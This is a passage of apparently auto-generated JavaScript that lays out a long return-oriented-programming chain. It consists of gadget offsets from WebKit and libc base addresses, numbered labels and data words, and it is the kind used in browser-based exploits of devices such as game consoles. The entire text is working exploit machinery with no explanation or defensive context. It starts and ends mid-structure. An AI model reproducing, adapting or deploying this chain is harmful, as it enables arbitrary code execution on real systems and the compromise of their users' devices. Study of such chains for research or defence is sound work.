ropchain+177432, //L2702
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+177464, //L2704
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+177416, //L2701
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+177448, //L2703
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2701:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2702:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2703:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2704:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+177560, //L2706
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+177544, //L2705
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2706:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2708:
ropchain+177664, //L2707
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+187200, //L2709
//L2707:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2710:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L2711:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+177832, //L2714
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+177816, //L2713
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2713:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+177936, //L2717
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+177952, //L2718
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2716:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+772328,); //pop rcx
//L2717:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2720:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2721:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+178112, //L2724
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+178096, //L2723
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2723:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+178272, //L2727
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+178304, //L2729
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+178256, //L2726
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+178288, //L2728
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2726:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2727:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2728:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+178408, //L2731
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+178424, //L2732
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2730:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+772328,); //pop rcx
//L2731:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+178488, //L2735
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2735:
db([0, 0]); // 0x0
//L2734:
set_gadgets([
libc_base+713278, //pop rsi
ropchain+178552, //L2738
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2737:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+772328,); //pop rcx
//L2738:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+178656, //L2741
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+178640, //L2740
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2740:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2741:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+178816, //L2744
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+178848, //L2746
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+178800, //L2743
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+178832, //L2745
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2744:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2745:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2746:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+178928, //L2747
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+178944, //L2748
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2747:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2748:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+179088, //L2752
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+179104, //L2753
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+179072, //L2751
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2750:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2751:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2752:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2753:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+179216, //L2754+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+179208, //L2754
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L2754:
db([0, 0]); // 0x0
set_gadgets([
ropchain+179232, //L2754+24
ropchain+184608, //L2749
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2755:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+772328,); //pop rcx
//L2756:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+179368, //L2759
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+179352, //L2758
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2758:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2759:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+179528, //L2762
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+179560, //L2764
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+179512, //L2761
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+179544, //L2763
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2761:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2762:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2763:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2764:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+179640, //L2765
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+179656, //L2766
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2765:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2766:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+179752, //L2768
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+179736, //L2767
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2767:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+179848, //L2770
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2769:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+772328,); //pop rcx
//L2770:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+179952, //L2773
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+179936, //L2772
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2772:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+180096, //L2777
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+180064, //L2775
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+180080, //L2776
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2775:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2776:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+180192, //L2779
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2778:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+772328,); //pop rcx
//L2779:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+180296, //L2782
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+180280, //L2781
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2781:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2782:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+180456, //L2785
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+180488, //L2787
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+180440, //L2784
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+180472, //L2786
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2784:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2785:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2786:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2787:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+180584, //L2789
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+180568, //L2788
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2788:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2789:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2791:
ropchain+180688, //L2790
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+185872, //L2792
//L2790:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+180776, //L2794
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2793:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L2794:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2796:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+180920, //L2799
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+180904, //L2798
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2798:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2799:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+181080, //L2802
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+181112, //L2804
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+181064, //L2801
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+181096, //L2803
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2802:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2804:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+181192, //L2805
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+181208, //L2806
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2805:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2806:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+181304, //L2808
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+181288, //L2807
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2807:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2808:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+181416, //L2811
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2809:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2810:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2811:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+181528, //L2812
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+181560, //L2814
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+181544, //L2813
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2814:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+8949069, //setle al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+181720, //L2815
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+181752, //L2817
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+181736, //L2816
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2815:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2816:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2817:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+181896, //L2821
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+181912, //L2822
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+181880, //L2820
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2819:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2820:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2821:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2822:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+182024, //L2823+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+182016, //L2823
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L2823:
db([0, 0]); // 0x0
set_gadgets([
ropchain+182040, //L2823+24
ropchain+182056, //L2818
libc_base+489696, //pop rsp
ropchain+184640, //L2824
//L2818:
libc_base+713278, //pop rsi
ropchain+182112, //L2826
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2825:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+772328,); //pop rcx
//L2826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+182216, //L2829
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+182200, //L2828
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2828:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+182360, //L2833
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+182328, //L2831
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+182344, //L2832
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2831:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2832:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+182432, //L2834
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+182488, //L2836
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2836:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+182584, //L2839
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2838:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L2839:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+182688, //L2842
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+182672, //L2841
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+182848, //L2845
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+182880, //L2847
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+182832, //L2844
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+182864, //L2846
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2844:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2845:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2846:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+182992, //L2848
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+183024, //L2850
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+183008, //L2849
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2848:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2849:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2850:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+183112, //L2851
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2851:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+183168, //L2853
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2853:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+183256, //L2856
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2855:
